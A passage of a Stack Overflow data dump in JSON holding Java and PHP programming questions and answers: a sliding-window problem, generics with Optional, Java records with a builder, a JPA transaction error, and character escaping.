j=startWindow;j&lt;endWindow;j++){\r\n    \t\t        if(A[j] &lt; 0 &amp;&amp; firstFlag){\r\n    \t\t          //  queue.add(A[j]);\r\n    \t\t          if(c&lt;C-1){\r\n    \t\t            output[++c]=A[j];\r\n    \t\t          }\r\n    \t\t            firstFlag=false;\r\n    \t\t            break;\r\n    \t\t        }\r\n    \t\t        if(j&gt;=N-1) {\r\n    \t\t        \tbreak;\r\n    \t\t        }\r\n    \t\t    }\r\n    \t\t    if(firstFlag){\r\n    \t\t        if(c&lt;C-1){\r\n    \t\t            output[++c]=0;\r\n    \t\t          }\r\n    \t\t      //  queue.add((long)0);\r\n    \t\t    }\r\n    \t\t    if(endWindow&gt;=N){\r\n    \t            break;\r\n    \t        }\r\n    \t        firstFlag=true;\r\n    \t\t    startWindow=startWindow+K-1;\r\n    \t\t    endWindow=startWindow+K;\r\n            }\r\n    // \t\twhile(!queue.isEmpty())\r\n    // \t\t      output[++c] = queue.remove();\r\n    \t\treturn output;\r\n\r\n","title":"First negative integer in every window of size k with auxiliary space O(1) and O(n) time complexity","body":"<pre><code>     Deque&lt;Long&gt; queue = new LinkedList&lt;&gt;();\n     int C=N-K+1;\n        long[] output = new long[C];\n        int c = -1;\n        int startWindow = 0;\n        int endWindow =K;\n        boolean firstFlag=true;\n        while (true) {\n            for(int j=startWindow;j&lt;endWindow;j++){\n                if(A[j] &lt; 0 &amp;&amp; firstFlag){\n                  //  queue.add(A[j]);\n                  if(c&lt;C-1){\n                    output[++c]=A[j];\n                  }\n                    firstFlag=false;\n                    break;\n                }\n                if(j&gt;=N-1) {\n                    break;\n                }\n            }\n            if(firstFlag){\n                if(c&lt;C-1){\n                    output[++c]=0;\n                  }\n              //  queue.add((long)0);\n            }\n            if(endWindow&gt;=N){\n                break;\n            }\n            firstFlag=true;\n            startWindow=startWindow+K-1;\n            endWindow=startWindow+K;\n        }\n//      while(!queue.isEmpty())\n//            output[++c] = queue.remove();\n        return output;\n</code></pre>\n"},{"tags":[],"owner":{"account_id":8671447,"reputation":1,"user_id":6490248,"display_name":"Gaurav Kumar"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1642492717,"creation_date":1642167501,"answer_id":70711442,"question_id":64406006,"body_markdown":"    function one_loop() {\r\n    \r\n        $arr = [-12, -1, 7, -8, 15, 30, -16, -30, 40, 3];\r\n        $arr_len = count($arr); // 7\r\n        $result = [];\r\n        $k = 2;\r\n        $i = 0;\r\n        $j = 0;\r\n    \r\n        while ($j &lt; $arr_len &amp;&amp; $i &lt; $arr_len-$k+1) {       \r\n            $flag = false;\r\n            $window_size = $j-$i+1;\r\n            if($arr[$j] &lt; 0) {\r\n                array_push($result, $arr[$j]);\r\n                $flag = true;\r\n            }\r\n            if($window_size == $k &amp;&amp; $flag == false){\r\n                array_push($result, 0);\r\n                $i++;\r\n                $j = $i;\r\n            } elseif ($flag == true) {\r\n                $i++;\r\n                $j = $i;\r\n            } elseif ($flag == false &amp;&amp; $window_size != $k) {\r\n                $j++;\r\n            }\r\n        }\r\n        echo implode($result, &quot;, &quot;);\r\n    }","title":"First negative integer in every window of size k with auxiliary space O(1) and O(n) time complexity","body":"<pre><code>function one_loop() {\n\n    $arr = [-12, -1, 7, -8, 15, 30, -16, -30, 40, 3];\n    $arr_len = count($arr); // 7\n    $result = [];\n    $k = 2;\n    $i = 0;\n    $j = 0;\n\n    while ($j &lt; $arr_len &amp;&amp; $i &lt; $arr_len-$k+1) {       \n        $flag = false;\n        $window_size = $j-$i+1;\n        if($arr[$j] &lt; 0) {\n            array_push($result, $arr[$j]);\n            $flag = true;\n        }\n        if($window_size == $k &amp;&amp; $flag == false){\n            array_push($result, 0);\n            $i++;\n            $j = $i;\n        } elseif ($flag == true) {\n            $i++;\n            $j = $i;\n        } elseif ($flag == false &amp;&amp; $window_size != $k) {\n            $j++;\n        }\n    }\n    echo implode($result, &quot;, &quot;);\n}\n</code></pre>\n"}],"owner":{"account_id":419939,"reputation":2373,"user_id":797368,"accept_rate":83,"display_name":"coder25"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1576,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"answer_count":5,"score":0,"last_activity_date":1642492717,"creation_date":1602959776,"question_id":64406006,"body_markdown":"Given an array and a positive integer k, find the first negative integer for each window(contiguous subarray) of size k. If a window does not contain a negative integer, then print 0 for that window.\r\n\r\n    package com.slidingwindow;\r\n    \r\n    public class demo2 {\r\n    \r\n    \r\n    \tpublic static void  maximum(int arr[], int k) {\r\n    \t\tint index = -1;\r\n    \t\tboolean flag = false;\r\n    \r\n    \t\tint i = 0, j = 0, sum = 0;\r\n    \r\n    \t\twhile (j &lt; arr.length) {\r\n    \t\t\t\r\n    \t\tif(arr[j]&lt;0 &amp;&amp; !flag) {\r\n    \t\t\tindex =j;\r\n    \t\t\tflag = true;\r\n    \t\t\tSystem.out.println(arr[index]);\r\n    \t\t}\r\n    \t\t\r\n    \t\t\t\r\n    \t\t\tif (j - i + 1 &lt; k) {\r\n    \t\t\t\tj++;\r\n    \t\t\t\t\r\n    \t\t\t} else if (j - i + 1 == k) {\r\n    \t\t\t\t\r\n    \t\t\t\tif(!flag) {\r\n    \t\t\t\t\tSystem.out.println(&quot;0&quot;);\r\n    \t\t\t\t\ti++;\r\n    \t\t\t\t\tj++;\r\n    \t\t\t\t}else {\r\n    \t\t\t\t\t//slide window by incrementing i and j\r\n    \t\t\t\t\ti++;\r\n    \t\t\t\t\tj++;\r\n    \t\t\t\t\tflag = false;a\r\n    \t\t\t\t}\r\n    \t\t\t\t\r\n    \t\t\t\t\r\n    \t\t\t}\r\n    \t\t}\r\n    \r\n    \t\r\n    \r\n    \t}\r\n    \tpublic static void main(String[] args) {\r\n    \t\tint arr[] = { -2, 5, 1, 8, -2, 9, -1 };\r\n    \t\tint k = 2;\r\n    \t\tmaximum(arr, k);\r\n    \t\t\r\n    \r\n    \t}\r\n    \r\n    }\r\n\r\n**Expected output** \r\n\r\n-2\r\n\r\n0\r\n\r\n0\r\n\r\n-2\r\n\r\n-2\r\n\r\n-1\r\n\r\n**Actual**\r\n\r\n\r\n-2\r\n\r\n0\r\n\r\n0\r\n\r\n-2\r\n\r\n0\r\n\r\n-1\r\n\r\n","title":"First negative integer in every window of size k with auxiliary space O(1) and O(n) time complexity","body":"<p>Given an array and a positive integer k, find the first negative integer for each window(contiguous subarray) of size k. If a window does not contain a negative integer, then print 0 for that window.</p>\n<pre><code>package com.slidingwindow;\n\npublic class demo2 {\n\n\n    public static void  maximum(int arr[], int k) {\n        int index = -1;\n        boolean flag = false;\n\n        int i = 0, j = 0, sum = 0;\n\n        while (j &lt; arr.length) {\n            \n        if(arr[j]&lt;0 &amp;&amp; !flag) {\n            index =j;\n            flag = true;\n            System.out.println(arr[index]);\n        }\n        \n            \n            if (j - i + 1 &lt; k) {\n                j++;\n                \n            } else if (j - i + 1 == k) {\n                \n                if(!flag) {\n                    System.out.println(&quot;0&quot;);\n                    i++;\n                    j++;\n                }else {\n                    //slide window by incrementing i and j\n                    i++;\n                    j++;\n                    flag = false;a\n                }\n                \n                \n            }\n        }\n\n    \n\n    }\n    public static void main(String[] args) {\n        int arr[] = { -2, 5, 1, 8, -2, 9, -1 };\n        int k = 2;\n        maximum(arr, k);\n        \n\n    }\n\n}\n</code></pre>\n<p><strong>Expected output</strong></p>\n<p>-2</p>\n<p>0</p>\n<p>0</p>\n<p>-2</p>\n<p>-2</p>\n<p>-1</p>\n<p><strong>Actual</strong></p>\n<p>-2</p>\n<p>0</p>\n<p>0</p>\n<p>-2</p>\n<p>0</p>\n<p>-1</p>\n"},{"tags":["java","types"],"answers":[{"tags":[],"owner":{"account_id":1063012,"reputation":71986,"user_id":1064245,"accept_rate":82,"display_name":"M A"},"down_vote_count":0,"up_vote_count":2,"is_accepted":true,"score":2,"last_activity_date":1642492585,"creation_date":1642492585,"answer_id":70752031,"question_id":70751952,"body_markdown":"It&#39;s because [generics are not covariant](https://stackoverflow.com/questions/2660827/java-generics-covariance): `Optional&lt;Foo&gt;` cannot be assigned to an `Optional&lt;Bar&gt;`.\r\n\r\nThe other example works because the compiler helps you infer the type to be `Bar`, i.e.:\r\n\r\n    Optional.of(Foo.X)\r\n\r\nis equivalent to:\r\n\r\n    Optional.&lt;Bar&gt;of(Foo.X)\r\n\r\nIf you try to explicitly tell the inferred type to the compiler, it will not accept it:\r\n\r\n    Optional.&lt;Foo&gt;of(Foo.X);  // does not compile","title":"What is the type of an Optional created from a constant different to one created from a stream?","body":"<p>It's because <a href=\"https://stackoverflow.com/questions/2660827/java-generics-covariance\">generics are not covariant</a>: <code>Optional&lt;Foo&gt;</code> cannot be assigned to an <code>Optional&lt;Bar&gt;</code>.</p>\n<p>The other example works because the compiler helps you infer the type to be <code>Bar</code>, i.e.:</p>\n<pre><code>Optional.of(Foo.X)\n</code></pre>\n<p>is equivalent to:</p>\n<pre><code>Optional.&lt;Bar&gt;of(Foo.X)\n</code></pre>\n<p>If you try to explicitly tell the inferred type to the compiler, it will not accept it:</p>\n<pre><code>Optional.&lt;Foo&gt;of(Foo.X);  // does not compile\n</code></pre>\n"}],"owner":{"account_id":45865,"reputation":11735,"user_id":135351,"accept_rate":80,"display_name":"dave"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":26,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"closed_date":1642492735,"accepted_answer_id":70752031,"answer_count":1,"score":1,"last_activity_date":1642492585,"creation_date":1642492225,"question_id":70751952,"body_markdown":"Let&#39;s say I have an interface `Bar` and an implementing class `Foo`:\r\n\r\n    interface Bar { ... }\r\n\r\n    class Foo implements Bar {\r\n      static final Foo X = new Foo();\r\n      static final Foo Y = new Foo();\r\n      static final Foo[] FOOS = { X, Y };\r\n    }\r\n\r\nNow let&#39;s say I have a class with methods that return `Optional&lt;Bar&gt;`:\r\n\r\n    public class Fubar {\r\n\r\n      public Optional&lt;Bar&gt; fromValue() {\r\n        return Optional.of(Foo.X); // This is fine\r\n      }\r\n    \r\n      public Optional&lt;Bar&gt; fromStreamA() {\r\n        \r\n        Optional&lt;Foo&gt; foo = Arrays.asList(Foo.FOOS).stream().findFirst();\r\n        \r\n        return foo; // This fails to compile\r\n      }\r\n\r\n      public Optional&lt;Bar&gt; fromStreamB() {\r\n\r\n        Optional&lt;Foo&gt; foo = Arrays.asList(Foo.FOOS).stream().findFirst();\r\n        if (foo.isPresent()) {\r\n          return Optional.of(foo.get()); // This is also fine\r\n        }\r\n        return Optional.empty();\r\n      }\r\n    }\r\n\r\nThe method `fromValue()` compiles correctly, however `fromStreamA()` does not. I get an error message along the lines of `Type mismatch: cannot convert from Optional&lt;Foo&gt; to Optional&lt;Bar&gt;`. I worked around this mismatch in `fromStreamB()` (which compiles correctly).\r\n\r\nI&#39;m having trouble understanding why `fromStreamA()` does not compile. I sense it&#39;s something to do with generics and is similar to why `List&lt;Foo&gt;` cannot be assigned to `List&lt;Bar&gt;`, however I can&#39;t grasp it. Can anyone explain why `fromValue()` is fine and `fromStreamA()` is not. \r\n","title":"What is the type of an Optional created from a constant different to one created from a stream?","body":"<p>Let's say I have an interface <code>Bar</code> and an implementing class <code>Foo</code>:</p>\n<pre><code>interface Bar { ... }\n\nclass Foo implements Bar {\n  static final Foo X = new Foo();\n  static final Foo Y = new Foo();\n  static final Foo[] FOOS = { X, Y };\n}\n</code></pre>\n<p>Now let's say I have a class with methods that return <code>Optional&lt;Bar&gt;</code>:</p>\n<pre><code>public class Fubar {\n\n  public Optional&lt;Bar&gt; fromValue() {\n    return Optional.of(Foo.X); // This is fine\n  }\n\n  public Optional&lt;Bar&gt; fromStreamA() {\n    \n    Optional&lt;Foo&gt; foo = Arrays.asList(Foo.FOOS).stream().findFirst();\n    \n    return foo; // This fails to compile\n  }\n\n  public Optional&lt;Bar&gt; fromStreamB() {\n\n    Optional&lt;Foo&gt; foo = Arrays.asList(Foo.FOOS).stream().findFirst();\n    if (foo.isPresent()) {\n      return Optional.of(foo.get()); // This is also fine\n    }\n    return Optional.empty();\n  }\n}\n</code></pre>\n<p>The method <code>fromValue()</code> compiles correctly, however <code>fromStreamA()</code> does not. I get an error message along the lines of <code>Type mismatch: cannot convert from Optional&lt;Foo&gt; to Optional&lt;Bar&gt;</code>. I worked around this mismatch in <code>fromStreamB()</code> (which compiles correctly).</p>\n<p>I'm having trouble understanding why <code>fromStreamA()</code> does not compile. I sense it's something to do with generics and is similar to why <code>List&lt;Foo&gt;</code> cannot be assigned to <code>List&lt;Bar&gt;</code>, however I can't grasp it. Can anyone explain why <code>fromValue()</code> is fine and <code>fromStreamA()</code> is not.</p>\n"},{"tags":["java","builder","java-17","java-record"],"comments":[{"owner":{"account_id":3116234,"reputation":9296,"user_id":2636929,"display_name":"Stultuske"},"score":0,"creation_date":1642492455,"post_id":70751967,"comment_id":125077929,"body_markdown":"why do you think this can&#39;t work with a public constructor? I admit, bit of an odd design, but still","body":"why do you think this can&#39;t work with a public constructor? I admit, bit of an odd design, but still"},{"owner":{"account_id":8393641,"reputation":850,"user_id":6301562,"display_name":"dawis11"},"score":0,"creation_date":1642492585,"post_id":70751967,"comment_id":125077980,"body_markdown":"I don&#39;t want to leave the possibility to create an object with a constructor that has a lot of fields, I want the object to be created only through the builder","body":"I don&#39;t want to leave the possibility to create an object with a constructor that has a lot of fields, I want the object to be created only through the builder"},{"owner":{"account_id":3116234,"reputation":9296,"user_id":2636929,"display_name":"Stultuske"},"score":0,"creation_date":1642492868,"post_id":70751967,"comment_id":125078073,"body_markdown":"if you want to hide the generated constructor, make sure no constructor is being generated.","body":"if you want to hide the generated constructor, make sure no constructor is being generated."},{"owner":{"account_id":3023214,"reputation":20362,"user_id":2563754,"display_name":"Seelenvirtuose"},"score":2,"creation_date":1642492934,"post_id":70751967,"comment_id":125078094,"body_markdown":"@Stultuske Unfortunately, this cannot be done. A record always has a generated constructor with all fields as arguments, and this constructor has the same visibility as the record declaration.","body":"@Stultuske Unfortunately, this cannot be done. A record always has a generated constructor with all fields as arguments, and this constructor has the same visibility as the record declaration."},{"owner":{"account_id":3023214,"reputation":20362,"user_id":2563754,"display_name":"Seelenvirtuose"},"score":1,"creation_date":1642493043,"post_id":70751967,"comment_id":125078142,"body_markdown":"@dawis11 The only thing I can recommend is to use the _compact constructor_ and do the validation inside that. At the moment, I do not see another way.","body":"@dawis11 The only thing I can recommend is to use the <i>compact constructor</i> and do the validation inside that. At the moment, I do not see another way."},{"owner":{"account_id":1416522,"reputation":91354,"user_id":3553087,"display_name":"Brian Goetz"},"score":2,"creation_date":1642513665,"post_id":70751967,"comment_id":125086399,"body_markdown":"@Seelenvirtuose Compactness has nothing to do with it; a compact constructor is just a shorthand for declaring the full canonical constructor, which you can also do.  But yes, constructors is where invariant checking goes.","body":"@Seelenvirtuose Compactness has nothing to do with it; a compact constructor is just a shorthand for declaring the full canonical constructor, which you can also do.  But yes, constructors is where invariant checking goes."},{"owner":{"account_id":3023214,"reputation":20362,"user_id":2563754,"display_name":"Seelenvirtuose"},"score":0,"creation_date":1642523902,"post_id":70751967,"comment_id":125091024,"body_markdown":"@BrianGoetz I know. Maybe I just wrote that in a misunderstanding way. I wanted to give a suggestion _and_ explain where to do it best.","body":"@BrianGoetz I know. Maybe I just wrote that in a misunderstanding way. I wanted to give a suggestion <i>and</i> explain where to do it best."}],"owner":{"account_id":8393641,"reputation":850,"user_id":6301562,"display_name":"dawis11"},"comment_count":7,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":60,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"closed_date":1642492834,"answer_count":0,"score":0,"last_activity_date":1642492280,"creation_date":1642492280,"question_id":70751967,"body_markdown":"I have record:\r\n\r\n```\r\n@Schema(title = &quot;Car&quot;)\r\npublic record CarResponse(\r\n        @Schema(\r\n        description = &quot;The car name&quot;,\r\n        example = &quot;Audi&quot;) \r\n        @JsonProperty(&quot;carId&quot;) String id) {\r\n}\r\n```\r\n\r\nand inner builder:\r\n\r\n``` \r\npublic static class Builder {\r\n        private String id;\r\n\r\n        public Builder withId(String id) {\r\n            this.id = id;\r\n            return this;\r\n        }\r\n \r\n        public CarResponse build() {\r\n            return new CarResponse(id);\r\n        }\r\n}\r\n``` \r\n\r\nIn this case, the problem is that my CarResponse constructor using record is public rather than private. Having a class and a builder to make a private constructor is not a problem, but what should be done in this case to hide the public constructor?\r\n\r\nMaybe one of the options builder put in the record, but in that case I lose the opportunity to add the swagger documentation on all fields.\r\n","title":"Java records private constructor with builder","body":"<p>I have record:</p>\n<pre><code>@Schema(title = &quot;Car&quot;)\npublic record CarResponse(\n        @Schema(\n        description = &quot;The car name&quot;,\n        example = &quot;Audi&quot;) \n        @JsonProperty(&quot;carId&quot;) String id) {\n}\n</code></pre>\n<p>and inner builder:</p>\n<pre><code>public static class Builder {\n        private String id;\n\n        public Builder withId(String id) {\n            this.id = id;\n            return this;\n        }\n \n        public CarResponse build() {\n            return new CarResponse(id);\n        }\n}\n</code></pre>\n<p>In this case, the problem is that my CarResponse constructor using record is public rather than private. Having a class and a builder to make a private constructor is not a problem, but what should be done in this case to hide the public constructor?</p>\n<p>Maybe one of the options builder put in the record, but in that case I lose the opportunity to add the swagger documentation on all fields.</p>\n"},{"tags":["java","mysql","hibernate","spring-data-jpa"],"comments":[{"owner":{"account_id":3116234,"reputation":9296,"user_id":2636929,"display_name":"Stultuske"},"score":0,"creation_date":1642490130,"post_id":70751507,"comment_id":125077185,"body_markdown":"the error message is quite clear. Apparently, the record you are trying to update doesn&#39;t exist. Which seems logical, since you delete it, before you try to update it. Remove the delete, and try again.","body":"the error message is quite clear. Apparently, the record you are trying to update doesn&#39;t exist. Which seems logical, since you delete it, before you try to update it. Remove the delete, and try again."},{"owner":{"account_id":3116234,"reputation":9296,"user_id":2636929,"display_name":"Stultuske"},"score":0,"creation_date":1642490449,"post_id":70751507,"comment_id":125077282,"body_markdown":"or the problem might be because you generate the homeworkId, and then try to execute an update.","body":"or the problem might be because you generate the homeworkId, and then try to execute an update."},{"owner":{"account_id":16290452,"reputation":489,"user_id":11764050,"display_name":"PaulD"},"score":0,"creation_date":1642490503,"post_id":70751507,"comment_id":125077300,"body_markdown":"by any chance, is the new homework id the same as the deleted one or not? Also, how is your `Homework` constructor working, since the field is of type student but you actually pass the id only","body":"by any chance, is the new homework id the same as the deleted one or not? Also, how is your <code>Homework</code> constructor working, since the field is of type student but you actually pass the id only"},{"owner":{"account_id":15441701,"reputation":37,"user_id":11140063,"display_name":"Svetlana Guma"},"score":0,"creation_date":1642490762,"post_id":70751507,"comment_id":125077377,"body_markdown":"@Stultuske what do you mean by `execute an update`? do delete+save in same Transactional method work as update? then how do I delete all `homeworks` and then insert a new one, in two separate Transactional methods? I don&#39;t need to _update_ any homework ever","body":"@Stultuske what do you mean by <code>execute an update</code>? do delete+save in same Transactional method work as update? then how do I delete all <code>homeworks</code> and then insert a new one, in two separate Transactional methods? I don&#39;t need to <i>update</i> any homework ever"},{"owner":{"account_id":3116234,"reputation":9296,"user_id":2636929,"display_name":"Stultuske"},"score":0,"creation_date":1642491056,"post_id":70751507,"comment_id":125077472,"body_markdown":"@SvetlanaGuma read the error message you get: &quot;Batch update returned unexpected row count from update&quot; you seem to be executing an update, but for an id that isn&#39;t known.","body":"@SvetlanaGuma read the error message you get: &quot;Batch update returned unexpected row count from update&quot; you seem to be executing an update, but for an id that isn&#39;t known."},{"owner":{"account_id":15441701,"reputation":37,"user_id":11140063,"display_name":"Svetlana Guma"},"score":0,"creation_date":1642491454,"post_id":70751507,"comment_id":125077590,"body_markdown":"@PaulD I have updated the question: `homeworkId` is generated from, for example, UUID, and the `studentId` is provided to `public Student(Long id) { ... }` constructor","body":"@PaulD I have updated the question: <code>homeworkId</code> is generated from, for example, UUID, and the <code>studentId</code> is provided to <code>public Student(Long id) { ... }</code> constructor"},{"owner":{"account_id":2755390,"reputation":464,"user_id":2483716,"accept_rate":40,"display_name":"user39950"},"score":0,"creation_date":1642491798,"post_id":70751507,"comment_id":125077700,"body_markdown":"maybe you need to recreate the tables because you started before with another domain class where the mapping was wrong","body":"maybe you need to recreate the tables because you started before with another domain class where the mapping was wrong"},{"owner":{"account_id":15441701,"reputation":37,"user_id":11140063,"display_name":"Svetlana Guma"},"score":0,"creation_date":1642491984,"post_id":70751507,"comment_id":125077768,"body_markdown":"@user39950 `homeworks` table is new from scratch, `students` exists for a while, that&#39;s why the relation is unidirectional - I didn&#39;t want to change anything in `students`","body":"@user39950 <code>homeworks</code> table is new from scratch, <code>students</code> exists for a while, that&#39;s why the relation is unidirectional - I didn&#39;t want to change anything in <code>students</code>"},{"owner":{"account_id":2755390,"reputation":464,"user_id":2483716,"accept_rate":40,"display_name":"user39950"},"score":0,"creation_date":1642492253,"post_id":70751507,"comment_id":125077865,"body_markdown":"try to recreate all in a new database and see if the issue persists","body":"try to recreate all in a new database and see if the issue persists"}],"owner":{"account_id":15441701,"reputation":37,"user_id":11140063,"display_name":"Svetlana Guma"},"comment_count":9,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":91,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1642492181,"creation_date":1642489717,"question_id":70751507,"body_markdown":"I have table MySQL table `homeworks` that has custom `id` - I need to generate it myself and set it in the constructor, and in table `students` ID is generated and I don&#39;t set it. I have a many-to-one unidirectional relationship between students and homeworks because table `students` exists for a while so I don&#39;t want to add new fields to `students` while table `homeworks` is newly created.\r\n\r\n```\r\n@Entity\r\n@Table(name = &quot;homeworks&quot;)\r\npublic class Homework {\r\n\r\n    @Id\r\n    @Column(name = &quot;homework_id&quot;)\r\n    String id;\r\n\r\n    @NotNull\r\n    @ManyToOne\r\n    @JoinColumn(name = &quot;student_id&quot;, nullable = false)\r\n    Student student;\r\n\r\n    @NotNull\r\n    @Column(name = &quot;data&quot;, nullable = false, columnDefinition = &quot;TEXT&quot;)\r\n    String data;\r\n\r\n    public Homework(String id, Long studentId, String data) {\r\n        this.id = id;\r\n        this.student = new Student(studentId);\r\n        this.data = data;\r\n    }\r\n}\r\n\r\n@Entity\r\n@Table(name = &quot;students&quot;)\r\npublic class Student {\r\n\r\n    @Id\r\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\r\n    Long id;\r\n\r\n    @NotNull\r\n    String name;\r\n\r\n    @NotNull\r\n    String address;\r\n\r\n    ... other fields, no relation to `Homework`\r\n\r\n    public Student(Long id) {\r\n        this.id = id;\r\n    }\r\n}\r\n```\r\n\r\nI work with repository that extends `JpaRepository`:\r\n```\r\n@Repository\r\npublic interface HomeworkRepository extends JpaRepository&lt;Homework, String&gt; {\r\n    void deleteByStudentId(Long studentId);\r\n}\r\n```\r\n\r\nI have method that removes all `homeworks` by field `student_id` and then inserts one new `homework`:\r\n```\r\n@Transactional\r\npublic HomeworkResult pass(Student student, String homeworkData) {\r\n\r\n    // some other logic\r\n    String newHomeworkId = UUID.randomUUID().toString();  // it&#39;s supposed to be pretty random\r\n\r\n    HomeworkResult homeworkResult = new HomeworkResult(data);  // this is some other helper class, not a table\r\n\r\n    this.homeworkRepository.deleteByStudentId(student.getId());\r\n    this.homeworkRepository.save(new Homework(newHomeworkId, student.getId(), homeworkData));\r\n\r\n    // return non-entity class\r\n    return homeworkResult;\r\n}\r\n```\r\n\r\nBut somewhere in the method (exact line is not shown in stacktrace - I guess because of `@Transactional`) an error happens:\r\n`Batch update returned unexpected row count from update [0]; actual row count: 0; expected: 1; statement executed: delete from homeworks where homework_id=?`\r\n\r\nI don&#39;t understand why something is deleted by `homework_id`? Is it hidden logic related to JPA or `@Transactional`?\r\n\r\nI don&#39;t get this error every time when I call this method, maybe the exception is thrown when the load gets higher? but why is it thrown?\r\n\r\nI tried to remove `@Transactional` and the method didn&#39;t work at all.","title":"Invalid query executed in @Transactional method and throws &quot;Batch update returned unexpected row count from update&quot;","body":"<p>I have table MySQL table <code>homeworks</code> that has custom <code>id</code> - I need to generate it myself and set it in the constructor, and in table <code>students</code> ID is generated and I don't set it. I have a many-to-one unidirectional relationship between students and homeworks because table <code>students</code> exists for a while so I don't want to add new fields to <code>students</code> while table <code>homeworks</code> is newly created.</p>\n<pre><code>@Entity\n@Table(name = &quot;homeworks&quot;)\npublic class Homework {\n\n    @Id\n    @Column(name = &quot;homework_id&quot;)\n    String id;\n\n    @NotNull\n    @ManyToOne\n    @JoinColumn(name = &quot;student_id&quot;, nullable = false)\n    Student student;\n\n    @NotNull\n    @Column(name = &quot;data&quot;, nullable = false, columnDefinition = &quot;TEXT&quot;)\n    String data;\n\n    public Homework(String id, Long studentId, String data) {\n        this.id = id;\n        this.student = new Student(studentId);\n        this.data = data;\n    }\n}\n\n@Entity\n@Table(name = &quot;students&quot;)\npublic class Student {\n\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    Long id;\n\n    @NotNull\n    String name;\n\n    @NotNull\n    String address;\n\n    ... other fields, no relation to `Homework`\n\n    public Student(Long id) {\n        this.id = id;\n    }\n}\n</code></pre>\n<p>I work with repository that extends <code>JpaRepository</code>:</p>\n<pre><code>@Repository\npublic interface HomeworkRepository extends JpaRepository&lt;Homework, String&gt; {\n    void deleteByStudentId(Long studentId);\n}\n</code></pre>\n<p>I have method that removes all <code>homeworks</code> by field <code>student_id</code> and then inserts one new <code>homework</code>:</p>\n<pre><code>@Transactional\npublic HomeworkResult pass(Student student, String homeworkData) {\n\n    // some other logic\n    String newHomeworkId = UUID.randomUUID().toString();  // it's supposed to be pretty random\n\n    HomeworkResult homeworkResult = new HomeworkResult(data);  // this is some other helper class, not a table\n\n    this.homeworkRepository.deleteByStudentId(student.getId());\n    this.homeworkRepository.save(new Homework(newHomeworkId, student.getId(), homeworkData));\n\n    // return non-entity class\n    return homeworkResult;\n}\n</code></pre>\n<p>But somewhere in the method (exact line is not shown in stacktrace - I guess because of <code>@Transactional</code>) an error happens:\n<code>Batch update returned unexpected row count from update [0]; actual row count: 0; expected: 1; statement executed: delete from homeworks where homework_id=?</code></p>\n<p>I don't understand why something is deleted by <code>homework_id</code>? Is it hidden logic related to JPA or <code>@Transactional</code>?</p>\n<p>I don't get this error every time when I call this method, maybe the exception is thrown when the load gets higher? but why is it thrown?</p>\n<p>I tried to remove <code>@Transactional</code> and the method didn't work at all.</p>\n"},{"tags":["java"],"comments":[{"owner":{"account_id":319873,"reputation":87612,"user_id":637853,"accept_rate":50,"display_name":"Thomas"},"score":1,"creation_date":1642492569,"post_id":70751815,"comment_id":125077973,"body_markdown":"Try providing a `Map&lt;Character, Character&gt;` which contains the unescaped character as the key and the escaped version as the value, e.g. you fill it via `escapedMap.put(&#39;n&#39;,&#39;\\n&#39;)`, `escapedMap.put(&#39;t&#39;,&#39;\\t&#39;)` etc. Then you just need to lookup the escaped version, e.g. `escapedMap.get(ch)`. If you don&#39;t get anything you&#39;ve encountered an illegal escape sequence. Btw, there aren&#39;t really that many escape sequences, at least [not in Java](https://docs.oracle.com/javase/tutorial/java/data/characters.html).","body":"Try providing a <code>Map&lt;Character, Character&gt;</code> which contains the unescaped character as the key and the escaped version as the value, e.g. you fill it via <code>escapedMap.put(&#39;n&#39;,&#39;\\n&#39;)</code>, <code>escapedMap.put(&#39;t&#39;,&#39;\\t&#39;)</code> etc. Then you just need to lookup the escaped version, e.g. <code>escapedMap.get(ch)</code>. If you don&#39;t get anything you&#39;ve encountered an illegal escape sequence. Btw, there aren&#39;t really that many escape sequences, at least <a href=\"https://docs.oracle.com/javase/tutorial/java/data/characters.html\" rel=\"nofollow noreferrer\">not in Java</a>."}],"owner":{"account_id":23670727,"reputation":256,"user_id":17697525,"display_name":"math-chen"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":45,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":0,"score":1,"last_activity_date":1642491990,"creation_date":1642491450,"question_id":70751815,"body_markdown":"I hava a question about how to help join split char to a escaped char?  \r\nthere is a example  \r\n**what i want is to join divide char to a escaped char**  \r\n**the escape rule should follow the java escape rule**  \r\n**Example Input**  \r\nchar[] input = {&#39;\\\\&#39;, &#39;n&#39;, &#39;\\\\&#39;, &#39;t&#39;, &#39;w&#39;, &#39;n&#39;};  \r\n**Expect Output**    \r\nchar[] expectOutput = {&#39;\\n&#39;, &#39;\\t&#39;, &#39;w&#39;, &#39;n&#39;};\r\n```java\r\npublic class Demo {\r\n\r\n  public static void main(String[] args) {\r\n    char[] input = {&#39;\\\\&#39;, &#39;n&#39;, &#39;\\\\&#39;, &#39;t&#39;, &#39;w&#39;, &#39;n&#39;};\r\n    char[] expect = {&#39;\\n&#39;, &#39;\\t&#39;, &#39;w&#39;, &#39;n&#39;};\r\n    char[] output = simpleImpl(input);\r\n  }\r\n\r\n  private static char[] simpleImpl(char[] input) {\r\n    char[] output = new char[input.length];\r\n    char prev = &#39;\\0&#39;;\r\n    int index = 0;\r\n    for (int i = 0; i &lt; input.length; i++) {\r\n      char ch = input[i];\r\n      if (ch == &#39;\\\\&#39;) {\r\n        prev = ch;\r\n      }\r\n      //need to escape\r\n      else if (prev == &#39;\\\\&#39;) {\r\n        if (ch == &#39;n&#39;) {\r\n          output[index++] = &#39;\\n&#39;;\r\n        } else if (ch == &#39;t&#39;) {\r\n          output[index++] = &#39;\\t&#39;;\r\n        } else {\r\n          // there are too many case\r\n        }\r\n      }\r\n      //simple char\r\n      else {\r\n        output[index++] = ch;\r\n      